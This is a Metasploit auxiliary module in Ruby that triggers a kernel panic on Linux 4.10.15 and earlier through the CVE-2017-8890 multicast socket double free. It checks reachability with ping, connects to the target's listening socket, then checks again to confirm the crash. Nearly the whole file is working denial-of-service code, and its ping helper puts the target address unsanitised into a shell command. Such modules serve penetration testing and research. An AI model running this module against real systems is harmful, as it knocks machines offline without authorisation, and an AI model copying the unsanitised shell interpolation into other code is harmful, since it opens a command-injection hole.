##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'socket'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  #include Msf::Exploit::Remote::Ipv6

  def initialize(info = {})
    super( update_info( info,
      'Name'           => 'Linux Multicast DoS',
      'Description'    => %q{
       Linux kernel versions 4.10.15 and below leave an extra copy of a multicast socket object
       at accept() time, if the MULTICAST_JOIN_GROUP option is set on the listening socket.
       Upon closing the connection, a double free occurs, leading to kernel panic.

       The target system must be of kernel version less than or equal to 4.10.15.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          '<syzkaller>', # Google's kernel fuzzer found this vulnerability
          '7043mcgeep <patrick.j.mcgee@marquette.edu>' # MSF module
        ],
      'Platform'       => ['linux'],
      'DisclosureDate' => '2017-05-10',
      'References'     =>
        [
          ['BID', '98562'],
          ['CVE', '2017-8890'],
          ['URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/ipv4/inet_connection_sock.c?h=v4.10#n668'],
          ['URL', 'https://thinkycx.me/posts/2018-10-30-a-glance-at-CVE-2017-8890.html'],
          ['URL', 'https://github.com/torvalds/linux/commit/657831ffc38e30092a2d5f03d385d710eb88b09a']
        ]
      ))

      register_options(
            [
              Opt::RHOST("127.0.0.1"),
              Opt::RPORT(4444),
              OptInt.new('WAIT_DOS', [true, 'Time to wait for target kernel to panic (in seconds)', 15])
            ]
      )
  end

  # Simply ping the target machine
  def ping_exec(addr, status)
    print_status("Pinging the target machine at #{addr}")
    reply = `ping -c 1 #{addr}` # Ping runs only once
    if (reply.include? '1 packets transmitted, 1 received') && (status == 'pre-connect')
      print_good('Target machine is running.')
    elsif (reply.include? '1 packets transmitted, 1 received') && (status == 'post-connect')
      print_error('Target machine responsive. DoS failed.')
      return
    elsif status == 'post-connect'
      print_good('No reply from target machine post-connection.')
    else
      print_error('No reply from target machine. Make sure it is reachable.')
      return
    end
  end

  def run
    ping_exec(rhost, 'pre-connect')
    #ping6(datastore['SHOST']) # built-in IPV6 ping function

    begin
      connect	 # Connect using TCP mixin
      print_good("Connection successfuly established with #{rhost}:#{rport}")
      disconnect # Disconnect right away since kernel panic already triggered
    rescue Rex::ConnectionRefused
      print_error("Failed to connect to #{rhost}:#{rport}. Connection refused. Make sure target is listening.")
      return
    rescue Rex::HostUnreachable
      print_error("Failed to connect to #{rhost}:#{rport}. Host unreachable.")
      return
    rescue Rex::AddressInUse
      print_error("Failed to connect to #{rhost}:#{rport}. Address in use.")
      return
    rescue ::Errno::ETIMEDOUT
      print_error("Failed to connect to #{rhost}:#{rport}. Timeout time exceeded.")
      return
    rescue Rex::ConnectionTimeout
      print_error("Failed to connect to #{rhost}:#{rport}. The connection timed out.")
      return
    end

    print_status("Waiting for #{datastore['WAIT_DOS']} seconds...")
    Rex.sleep(datastore['WAIT_DOS'])

    ping_exec(rhost, 'post-connect') # No reply if kernel panicked
    #ping6(datastore['SHOST']) # built-in IPV6 ping function
  end
end
